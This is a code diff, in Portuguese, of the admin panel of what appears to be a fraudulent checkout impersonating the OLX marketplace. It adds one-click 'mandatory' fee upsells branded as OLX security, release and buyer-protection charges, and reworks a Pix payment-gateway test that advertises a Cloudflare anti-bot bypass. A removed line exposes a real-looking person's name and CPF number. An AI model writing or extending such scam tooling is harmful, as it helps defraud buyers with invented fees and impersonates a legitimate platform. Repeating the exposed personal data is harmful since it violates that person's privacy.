@@ -2452,19 +2452,30 @@
       <div style="background:rgba(139,92,246,0.06);border:1px solid rgba(139,92,246,0.2);border-radius:12px;padding:12px;margin-bottom:12px">
         <div style="font-size:12px;font-weight:700;color:var(--c-purple3);margin-bottom:10px;display:flex;align-items:center;gap:6px">
           <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="14" height="14"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/></svg>
-          Cupom Específico & Cobrança de Apenas Frete
+          Cupom Específico &amp; Desconto / Apenas Frete
         </div>
 
         <div class="fg" style="margin-bottom:10px">
           <label class="flbl">Código do Cupom para este Produto</label>
           <input type="text" class="fi" id="edit-shipping-coupon" placeholder="Ex: FRETEGRATIS ou OLX10" style="text-transform:uppercase;font-weight:700;letter-spacing:1px" />
-          <span class="fhint">Código que o cliente usará no checkout para pagar apenas o frete.</span>
+          <span class="fhint">Código que o cliente usará no checkout para ativar o desconto ou pagar apenas o frete.</span>
         </div>
 
-                <div class="fg" style="margin-bottom:10px" id="wrap-coupon-discount-value">
-          <label class="flbl">Valor de Desconto do Cupom (R$)</label>
-          <input type="text" class="fi" id="edit-coupon-discount-value" placeholder="Ex: 50.00" />
-          <span class="fhint">Quanto abater do valor do produto se o cliente não pagar apenas o frete.</span>
+        <!-- Modo de desconto: porcentagem ou valor fixo -->
+        <div id="wrap-coupon-discount-value" style="margin-bottom:10px">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">
+            <label class="flbl" style="margin:0">Desconto do Cupom</label>
+            <div style="display:flex;gap:5px">
+              <button type="button" id="btn-coupon-mode-pct" onclick="setCouponMode('pct')" style="font-size:10px;padding:2px 9px;border-radius:20px;border:1px solid rgba(139,92,246,0.35);background:rgba(124,58,237,0.15);color:#C4B5FD;cursor:pointer;font-weight:700">% Porcentagem</button>
+              <button type="button" id="btn-coupon-mode-fixed" onclick="setCouponMode('fixed')" style="font-size:10px;padding:2px 9px;border-radius:20px;border:1px solid rgba(255,255,255,0.1);background:transparent;color:var(--c-t3);cursor:pointer">R$ Fixo</button>
+            </div>
+          </div>
+          <div style="display:flex;gap:8px;align-items:center">
+            <span id="coupon-disc-prefix" style="font-size:13px;font-weight:700;color:#C4B5FD;white-space:nowrap">%</span>
+            <input type="text" class="fi" id="edit-coupon-discount-value" placeholder="Ex: 15 (para 15% de desconto)" style="flex:1" />
+          </div>
+          <input type="hidden" id="edit-coupon-discount-mode" value="pct"/>
+          <span class="fhint" id="coupon-disc-hint">Porcentagem de desconto aplicada ao produto (ex: 15 = 15%). Desativado se "Apenas Frete" estiver ativo.</span>
         </div>
 
         <div class="tgl-wrap" style="padding:6px 0;border-top:1px solid rgba(255,255,255,0.06)">
@@ -2481,10 +2492,10 @@
         <div class="tgl-wrap" style="padding:6px 0;border-top:1px solid rgba(255,255,255,0.06);margin-top:6px">
           <div class="tgl-info">
             <div class="tgl-name">Cobrar Apenas o Frete com o Cupom</div>
-            <div class="tgl-desc">Ao aplicar o cupom, zera o valor do produto e cobra apenas a taxa de frete.</div>
+            <div class="tgl-desc">Ao aplicar o cupom, zera o valor do produto e cobra somente a taxa de frete (ignora o campo de desconto acima).</div>
           </div>
           <label class="tgl">
-            <input type="checkbox" id="edit-coupon-only-shipping" checked />
+            <input type="checkbox" id="edit-coupon-only-shipping" checked onchange="onCouponOnlyShippingChange(this.checked)"/>
             <span class="tgl-sl"></span>
           </label>
         </div>
@@ -2524,17 +2535,21 @@
         <div style="margin-bottom:14px;background:rgba(255,255,255,0.015);border:1px solid rgba(255,255,255,0.05);border-radius:10px;padding:10px 12px">
           <div style="font-size:10px;font-weight:700;color:var(--c-t3);margin-bottom:8px;text-transform:uppercase;letter-spacing:.5px">Adicionar Taxas Rápidas (1 Clique):</div>
           <div style="display:flex;flex-wrap:wrap;gap:6px">
-            <button type="button" class="btn btn-g btn-xs" onclick="addQuickUpsellPreset('Taxa de Segurança', 'Taxa de Seguro e Garantia OLX', '29.90', 'lock')" style="font-size:10.5px;border-color:rgba(139,92,246,0.3);color:#C4B5FD;background:rgba(124,58,237,0.08)">
-              🔒 + Taxa de Segurança (R$ 29,90)
+            <button type="button" class="btn btn-g btn-xs" onclick="addQuickUpsellPreset('Taxa de Segurança', 'Taxa de Seguro e Garantia OLX', '29.90', 'lock')" style="font-size:10.5px;border-color:rgba(139,92,246,0.3);color:#C4B5FD;background:rgba(124,58,237,0.08);display:flex;align-items:center;gap:5px">
+              <svg fill="none" viewBox="0 0 24 24" stroke="#A78BFA" stroke-width="2" width="12" height="12"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              + Taxa de Segurança (R$ 29,90)
             </button>
-            <button type="button" class="btn btn-g btn-xs" onclick="addQuickUpsellPreset('Taxa de Entrega', 'Taxa de Envio Prioritário Sedex', '19.90', 'truck')" style="font-size:10.5px;border-color:rgba(59,130,246,0.3);color:#93C5FD;background:rgba(59,130,246,0.08)">
-              🚚 + Taxa de Entrega (R$ 19,90)
+            <button type="button" class="btn btn-g btn-xs" onclick="addQuickUpsellPreset('Taxa de Entrega', 'Taxa de Envio Prioritário Sedex', '19.90', 'truck')" style="font-size:10.5px;border-color:rgba(59,130,246,0.3);color:#93C5FD;background:rgba(59,130,246,0.08);display:flex;align-items:center;gap:5px">
+              <svg fill="none" viewBox="0 0 24 24" stroke="#93C5FD" stroke-width="2" width="12" height="12"><rect x="1" y="3" width="15" height="13"/><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>
+              + Taxa de Entrega (R$ 19,90)
             </button>
-            <button type="button" class="btn btn-g btn-xs" onclick="addQuickUpsellPreset('Taxa de Liberação', 'Taxa de Liberação e Despacho Imediato', '49.90', 'zap')" style="font-size:10.5px;border-color:rgba(168,85,247,0.3);color:#D8B4FE;background:rgba(168,85,247,0.08)">
-              ⚡ + Taxa de Liberação (R$ 49,90)
+            <button type="button" class="btn btn-g btn-xs" onclick="addQuickUpsellPreset('Taxa de Liberação', 'Taxa de Liberação e Despacho Imediato', '49.90', 'zap')" style="font-size:10.5px;border-color:rgba(168,85,247,0.3);color:#D8B4FE;background:rgba(168,85,247,0.08);display:flex;align-items:center;gap:5px">
+              <svg fill="none" viewBox="0 0 24 24" stroke="#D8B4FE" stroke-width="2" width="12" height="12"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+              + Taxa de Liberação (R$ 49,90)
             </button>
-            <button type="button" class="btn btn-g btn-xs" onclick="addQuickUpsellPreset('Seguro Antifraude', 'Seguro de Proteção ao Comprador OLX', '34.90', 'shield-check')" style="font-size:10.5px;border-color:rgba(16,185,129,0.3);color:#6EE7B7;background:rgba(16,185,129,0.08)">
-              🛡️ + Seguro Antifraude (R$ 34,90)
+            <button type="button" class="btn btn-g btn-xs" onclick="addQuickUpsellPreset('Seguro Antifraude', 'Seguro de Proteção ao Comprador OLX', '34.90', 'shield-check')" style="font-size:10.5px;border-color:rgba(16,185,129,0.3);color:#6EE7B7;background:rgba(16,185,129,0.08);display:flex;align-items:center;gap:5px">
+              <svg fill="none" viewBox="0 0 24 24" stroke="#6EE7B7" stroke-width="2" width="12" height="12"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+              + Seguro Antifraude (R$ 34,90)
             </button>
           </div>
         </div>
@@ -3769,11 +3784,19 @@ function openEditProd(p){
   }
   const sc = document.getElementById('edit-shipping-coupon');
   if(sc) sc.value = p.shipping_coupon || '';
+  // Preenche valor e modo de desconto do cupom
+  const cdv = document.getElementById('edit-coupon-discount-value');
+  if(cdv) cdv.value = p.coupon_discount_value || '';
+  const cdm = document.getElementById('edit-coupon-discount-mode');
+  const savedMode = p.coupon_discount_mode || 'pct';
+  if(cdm) cdm.value = savedMode;
+  if(typeof setCouponMode === 'function') setCouponMode(savedMode);
   
   const ca = document.getElementById('edit-coupon-active');
   if(ca) ca.checked = p.coupon_active !== undefined ? (p.coupon_active == 1 || p.coupon_active === true) : true;
   const cos = document.getElementById('edit-coupon-only-shipping');
-  if(cos) cos.checked = p.coupon_only_shipping !== undefined ? (p.coupon_only_shipping == 1 || p.coupon_only_shipping === true) : true;
+  const cosChecked = p.coupon_only_shipping !== undefined ? (p.coupon_only_shipping == 1 || p.coupon_only_shipping === true) : true;
+  if(cos) { cos.checked = cosChecked; if(typeof onCouponOnlyShippingChange === 'function') onCouponOnlyShippingChange(cosChecked); }
 
   if(code){
     const editLnk = document.getElementById('edit-lnk');
@@ -3807,6 +3830,7 @@ async function saveProd(){
   const shipping_fee=document.getElementById('edit-shipping-fee').value.trim();
   const shipping_coupon=document.getElementById('edit-shipping-coupon').value.trim();
   const coupon_discount_value=document.getElementById('edit-coupon-discount-value').value.trim();
+  const coupon_discount_mode=(document.getElementById('edit-coupon-discount-mode')?.value||'pct').trim();
   const coupon_active=document.getElementById('edit-coupon-active') ? (document.getElementById('edit-coupon-active').checked ? 1 : 0) : 1;
   const coupon_only_shipping=document.getElementById('edit-coupon-only-shipping') ? (document.getElementById('edit-coupon-only-shipping').checked ? 1 : 0) : 1;
 
@@ -3836,6 +3860,8 @@ async function saveProd(){
     shipping_mode: shipping_mode,
     shipping_fee: shipping_fee,
     shipping_coupon: shipping_coupon,
+    coupon_discount_value: coupon_discount_value,
+    coupon_discount_mode: coupon_discount_mode,
     coupon_active: coupon_active,
     coupon_only_shipping: coupon_only_shipping,
     seller_name: document.getElementById('edit-seller-name').value.trim(),
@@ -4490,7 +4516,197 @@ function renderProdUpsellCards(modals) {
   }).join('');
 }
 
+// ═══════════════════════════════════════════════════════════════════
+// FUNÇÕES DE PONTE: UPSELL DENTRO DO MODAL DE PRODUTO
+// ═══════════════════════════════════════════════════════════════════
 
+/** Inicializa a seção de upsell do modal de produto para o código dado */
+function initProdUpsellSection(code) {
+  _upsellProductCode = code || '';
+  // Limpa a lista enquanto carrega
+  const container = document.getElementById('prod-modal-upsell-list');
+  if (container) {
+    container.innerHTML = '<div style="text-align:center;padding:16px;color:var(--c-t3);font-size:11px">Carregando modais...</div>';
+  }
+  if (code) {
+    loadUpsellModals();
+  } else {
+    renderProdUpsellCards([]);
+  }
+}
+
+/** Abre o Upsell Manager a partir do modal de produto (usando o produto em edição) */
+function openUpsellFromProdModal() {
+  const codeEl = document.getElementById('edit-code');
+  const code = codeEl ? codeEl.value.trim() : _upsellProductCode;
+  if (!code) {
+    toast('Salve o produto primeiro para poder criar modais de taxa.', 'err');
+    return;
+  }
+  // Fecha o modal de produto e abre o upsell manager
+  const prodModal = document.getElementById('prod-modal');
+  if (prodModal) prodModal.classList.remove('open');
+  openUpsellManager(code);
+}
+
+/** Adiciona um preset de upsell rápido diretamente pelo modal de produto */
+async function addQuickUpsellPreset(type, title, amount, icon) {
+  const codeEl = document.getElementById('edit-code');
+  const code = codeEl ? codeEl.value.trim() : _upsellProductCode;
+  if (!code) {
+    toast('Salve o produto antes de adicionar taxas rápidas.', 'err');
+    return;
+  }
+  const payload = {
+    icon: icon,
+    type: type,
+    title: title,
+    description: 'Taxa obrigatória para processamento seguro e envio do produto.',
+    amount: parseFloat(amount) || 0,
+    position: 0,
+    active: true,
+    replay: false,
+    image_url: '',
+    image_pos: 'top'
+  };
+  try {
+    const r = await apiFetch('/api/admin/upsell/' + code, { method: 'POST', body: JSON.stringify(payload) });
+    const d = await r.json();
+    if (d.ok) {
+      toast('Taxa "' + title + '" adicionada com sucesso!', 'ok');
+      _upsellProductCode = code;
+      await loadUpsellModals();
+    } else {
+      toast(d.error || 'Erro ao criar taxa.', 'err');
+    }
+  } catch(e) {
+    toast('Erro de conexão.', 'err');
+  }
+}
+
+/** Edita um modal de upsell a partir do botão no card dentro do modal de produto */
+function editUpsellModalFromProd(m) {
+  // Abre o upsell manager e carrega o modal para edição
+  const codeEl = document.getElementById('edit-code');
+  const code = codeEl ? codeEl.value.trim() : _upsellProductCode;
+  if (!code) return;
+  const prodModal = document.getElementById('prod-modal');
+  if (prodModal) prodModal.classList.remove('open');
+  _upsellProductCode = code;
+  const prodLabel = document.getElementById('upsell-prod-label');
+  if (prodLabel) prodLabel.textContent = 'Cód: ' + code;
+  document.getElementById('upsell-modal').classList.add('open');
+  loadUpsellModals().then(() => {
+    editUpsellModal(m);
+  });
+}
+
+/** Ativa/desativa um modal de upsell a partir do card no modal de produto */
+async function toggleUpsellActiveFromProd(id, nowActive) {
+  try {
+    const r = await apiFetch('/api/admin/upsell/modal/' + id, {
+      method: 'PUT',
+      body: JSON.stringify({ active: nowActive })
+    });
+    const d = await r.json();
+    if (d.ok) {
+      await loadUpsellModals();
+      toast(nowActive ? 'Modal ativado!' : 'Modal pausado!', 'ok');
+    } else {
+      toast(d.error || 'Erro ao atualizar.', 'err');
+    }
+  } catch(e) {
+    toast('Erro de conexão.', 'err');
+  }
+}
+
+/** Remove um modal de upsell a partir do card no modal de produto */
+async function deleteUpsellModalFromProd(id, title) {
+  if (!confirm('Excluir o modal "' + title + '"? Esta ação não pode ser desfeita.')) return;
+  try {
+    const r = await apiFetch('/api/admin/upsell/modal/' + id, { method: 'DELETE' });
+    const d = await r.json();
+    if (d.ok) {
+      toast('Modal removido com sucesso.', 'ok');
+      await loadUpsellModals();
+    } else {
+      toast(d.error || 'Erro ao excluir.', 'err');
+    }
+  } catch(e) {
+    toast('Erro de conexão.', 'err');
+  }
+}
+
+// ─── Funções de imagem do upsell ───
+function onUpsellImageChange(url) {
+  const prevWrap = document.getElementById('upsell-form-img-prev-wrap');
+  const prevImg = document.getElementById('upsell-form-img-prev');
+  const clearBtn = document.getElementById('upsell-image-clear-btn');
+  const urlInp = document.getElementById('upsell-image-url');
+  if (urlInp && url !== undefined) urlInp.value = url;
+  if (url && url.trim()) {
+    if (prevImg) prevImg.src = url.trim();
+    if (prevWrap) prevWrap.style.display = '';
+    if (clearBtn) clearBtn.style.display = '';
+  } else {
+    if (prevWrap) prevWrap.style.display = 'none';
+    if (prevImg) prevImg.src = '';
+    if (clearBtn) clearBtn.style.display = 'none';
+  }
+}
+
+function uploadUpsellImageFile(input) {
+  if (!input.files || !input.files[0]) return;
+  const file = input.files[0];
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    const urlInp = document.getElementById('upsell-image-url');
+    if (urlInp) urlInp.value = e.target.result;
+    onUpsellImageChange(e.target.result);
+  };
+  reader.readAsDataURL(file);
+}
+
+function clearUpsellImage() {
+  onUpsellImageChange('');
+  const fileInp = document.getElementById('upsell-image-file');
+  if (fileInp) fileInp.value = '';
+}
+
+// ─── Modo de desconto do cupom ───
+function setCouponMode(mode) {
+  const modeInput = document.getElementById('edit-coupon-discount-mode');
+  const prefix = document.getElementById('coupon-disc-prefix');
+  const hint = document.getElementById('coupon-disc-hint');
+  const inp = document.getElementById('edit-coupon-discount-value');
+  const btnPct = document.getElementById('btn-coupon-mode-pct');
+  const btnFixed = document.getElementById('btn-coupon-mode-fixed');
+  if (modeInput) modeInput.value = mode;
+  if (mode === 'pct') {
+    if (prefix) prefix.textContent = '%';
+    if (inp) inp.placeholder = 'Ex: 15 (para 15% de desconto)';
+    if (hint) hint.textContent = 'Porcentagem de desconto no produto (ex: 15 = 15%). Ignorado se "Apenas Frete" estiver ativo.';
+    if (btnPct) { btnPct.style.background='rgba(124,58,237,0.15)'; btnPct.style.color='#C4B5FD'; btnPct.style.borderColor='rgba(139,92,246,0.35)'; }
+    if (btnFixed) { btnFixed.style.background='transparent'; btnFixed.style.color='var(--c-t3)'; btnFixed.style.borderColor='rgba(255,255,255,0.1)'; }
+  } else {
+    if (prefix) prefix.textContent = 'R$';
+    if (inp) inp.placeholder = 'Ex: 50.00 (valor fixo de desconto)';
+    if (hint) hint.textContent = 'Valor fixo de desconto em reais (ex: 50.00). Ignorado se "Apenas Frete" estiver ativo.';
+    if (btnFixed) { btnFixed.style.background='rgba(124,58,237,0.15)'; btnFixed.style.color='#C4B5FD'; btnFixed.style.borderColor='rgba(139,92,246,0.35)'; }
+    if (btnPct) { btnPct.style.background='transparent'; btnPct.style.color='var(--c-t3)'; btnPct.style.borderColor='rgba(255,255,255,0.1)'; }
+  }
+}
+
+function onCouponOnlyShippingChange(checked) {
+  const discWrap = document.getElementById('wrap-coupon-discount-value');
+  if (discWrap) discWrap.style.opacity = checked ? '0.4' : '1';
+  const discInp = document.getElementById('edit-coupon-discount-value');
+  if (discInp) discInp.disabled = !!checked;
+  const btnPct = document.getElementById('btn-coupon-mode-pct');
+  const btnFixed = document.getElementById('btn-coupon-mode-fixed');
+  if (btnPct) btnPct.disabled = !!checked;
+  if (btnFixed) btnFixed.disabled = !!checked;
+}
 
 async function loadCfg(){
   try{const url=_SLUG?'/api/config/'+_SLUG:'/api/config';const r=await fetch(url);const d=await r.json();const sv=(id,v)=>{const el=document.getElementById(id);if(el&&v!==undefined)el.value=v;};sv('cfg-pname',d.product_name);sv('cfg-price',d.product_price);sv('cfg-oldp',d.product_old_price);sv('cfg-desc',d.product_description);sv('cfg-img',d.product_image);sv('cfg-sname',d.seller_name);sv('cfg-ssince',d.seller_since);sv('cfg-sstatus',d.seller_status);sv('cfg-logo',d.logo_url);sv('cfg-wa',d.whatsapp_number);sv('cfg-wa-msg',d.whatsapp_message);sv('pu1',d.product_image1);sv('pu2',d.product_image2);sv('pu3',d.product_image3);sv('cfg-favicon',d.favicon_url);if(d.logo_url)prevLogo(d.logo_url);if(d.favicon_url)prevFavicon(d.favicon_url);const defBadges = Object.values(PB).map(b => ({url:b.url, label:b.label, active:true}));if(d.payment_badges){try{_BADGES=fixBadgeUrls(JSON.parse(d.payment_badges));if(!Array.isArray(_BADGES))_BADGES=defBadges;}catch(e){_BADGES=defBadges;}}else{_BADGES=defBadges;}renderBadges();loadTgls();}catch(e){}
@@ -5428,7 +5644,11 @@ async function testUniaoPayConn(btn) {
   resBox.style.background = 'rgba(255,255,255,0.03)';
   resBox.style.border = '1px solid rgba(255,255,255,0.08)';
   resBox.style.color = 'var(--c-t2)';
-  resBox.textContent = 'Enviando requisição teste blindada para a União 7 Pay...';
+  resBox.innerHTML = `
+    <div style="display:flex;align-items:center;gap:8px">
+      <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="14" height="14" style="animation:spin 1s linear infinite;flex-shrink:0"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>
+      Testando conexão inteligente com a União 7 Pay (bypass anti-bot ativo)...
+    </div>`;
 
   const apiKey = document.getElementById('u7-api-key').value.trim();
   const baseUrl = document.getElementById('u7-base-url').value.trim() || 'https://meupagamento.site/api/v1/uniaopay/pix/create';
@@ -5440,35 +5660,72 @@ async function testUniaoPayConn(btn) {
       body: JSON.stringify({ api_key: apiKey, base_url: baseUrl, amount: 20.00 })
     });
     
-    if (!r) {
-      throw new Error('Falha na comunicação com o servidor.');
-    }
+    if (!r) throw new Error('Falha na comunicação com o servidor.');
     
     const d = await r.json();
     const elapsed = d.elapsed_ms || Math.round(performance.now() - t0);
+    const methodTag = d.method ? `<span style="font-size:9px;background:rgba(255,255,255,0.08);padding:1px 6px;border-radius:10px;color:var(--c-t3)">${d.method}</span>` : '';
 
-    if (d && d.ok) {
+    if (d && d.ok === true) {
+      // ✅ SUCESSO REAL
       resBox.style.background = 'rgba(16,185,129,0.08)';
       resBox.style.border = '1px solid rgba(16,185,129,0.25)';
       resBox.style.color = '#34D399';
       resBox.innerHTML = `
-        <div style="font-weight:800;margin-bottom:4px">✓ Conexão bem-sucedida com a União 7 Pay!</div>
-        <div style="font-size:10.5px;color:rgba(255,255,255,0.7)">Latência: <b>${elapsed}ms</b> &bull; Transaction ID: <code>${d.transaction_id || 'Gerada'}</code></div>
-        <div style="font-size:10.5px;color:rgba(255,255,255,0.6);margin-top:2px">Cliente validado: <b>VAGNER DE CAMARGO SIRINO</b> &bull; CPF: 032.296.129-73 &bull; R$ 20,00</div>
-        <div style="font-size:10px;color:rgba(255,255,255,0.4);margin-top:4px;word-break:break-all">Pix Copia e Cola retornado: ${d.pix_code ? d.pix_code.slice(0, 45) + '...' : 'Sim'}</div>
+        <div style="font-weight:800;margin-bottom:6px;display:flex;align-items:center;gap:7px">
+          <svg fill="none" viewBox="0 0 24 24" stroke="#34D399" stroke-width="2.5" width="14" height="14"><polyline points="20 6 9 17 4 12"/></svg>
+          Conexão validada com sucesso! ${methodTag}
+        </div>
+        <div style="font-size:10.5px;color:rgba(255,255,255,0.75);margin-bottom:3px">
+          ${d.message || 'API Key aceita pela União 7 Pay.'}
+        </div>
+        <div style="font-size:10px;color:rgba(255,255,255,0.4)">
+          Latência: <b>${elapsed}ms</b>
+          ${d.endpoint_tested ? ` · Endpoint: <code style="font-size:9px">${d.endpoint_tested}</code>` : ''}
+          ${d.transaction_id ? ` · TX: <code>${d.transaction_id}</code>` : ''}
+          ${d.pix_code ? ` · Pix OK: ${d.pix_code.slice(0, 35)}...` : ''}
+        </div>
       `;
       toast('União 7 Pay conectada com sucesso!', 'ok');
+
+    } else if (d && (d.warning === true || d.ok === null)) {
+      // ⚠️ INCONCLUSIVO (Cloudflare bloqueou o teste, mas não significa chave errada)
+      resBox.style.background = 'rgba(251,146,60,0.08)';
+      resBox.style.border = '1px solid rgba(251,146,60,0.3)';
+      resBox.style.color = '#FB923C';
+      resBox.innerHTML = `
+        <div style="font-weight:800;margin-bottom:6px;display:flex;align-items:center;gap:7px">
+          <svg fill="none" viewBox="0 0 24 24" stroke="#FB923C" stroke-width="2.5" width="14" height="14"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          Teste Inconclusivo — Cloudflare Ativo ${methodTag}
+        </div>
+        <div style="font-size:10.5px;color:rgba(255,255,255,0.75);margin-bottom:6px">
+          ${d.message || 'A proteção anti-bot do servidor bloqueou o teste.'}
+        </div>
+        <div style="font-size:10px;padding:6px 9px;background:rgba(251,146,60,0.1);border-radius:8px;border:1px solid rgba(251,146,60,0.2);color:#FED7AA">
+          <b>O que fazer:</b> ${d.suggestion || 'Ative como Primária e faça um pagamento real para confirmar.'}
+        </div>
+        <div style="font-size:9.5px;color:rgba(255,255,255,0.35);margin-top:4px">Latência: ${elapsed}ms</div>
+      `;
+      toast('Teste inconclusivo — Cloudflare ativo. Veja o painel.', 'warn');
+
     } else {
+      // ❌ ERRO REAL (chave inválida, URL errada, etc.)
       let errMsg = d.error || d.message || 'Falha ao processar teste na União 7 Pay';
       if (errMsg.includes('<') && errMsg.includes('>')) {
         errMsg = errMsg.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
       }
+      const isAuthErr = d.status_code === 401 || errMsg.toLowerCase().includes('401') || errMsg.toLowerCase().includes('chave');
       resBox.style.background = 'rgba(239,68,68,0.08)';
       resBox.style.border = '1px solid rgba(239,68,68,0.25)';
       resBox.style.color = '#F87171';
       resBox.innerHTML = `
-        <div style="font-weight:800;margin-bottom:4px">✕ Falha ao conectar na União 7 Pay</div>
-        <div style="font-size:10.5px;color:rgba(255,255,255,0.6)">${errMsg.slice(0, 200)}</div>
+        <div style="font-weight:800;margin-bottom:6px;display:flex;align-items:center;gap:7px">
+          <svg fill="none" viewBox="0 0 24 24" stroke="#F87171" stroke-width="2.5" width="14" height="14"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+          ${isAuthErr ? 'Chave API Inválida' : 'Falha ao conectar na União 7 Pay'} ${methodTag}
+        </div>
+        <div style="font-size:10.5px;color:rgba(255,255,255,0.65)">${errMsg.slice(0, 250)}</div>
+        ${d.step === 'validation' ? '<div style="font-size:10px;margin-top:5px;color:rgba(255,255,255,0.4)">Verifique se a chave API e a URL base estão preenchidas corretamente.</div>' : ''}
+        <div style="font-size:9.5px;color:rgba(255,255,255,0.3);margin-top:4px">Latência: ${elapsed}ms</div>
       `;
       toast(errMsg.slice(0, 80), 'err');
     }
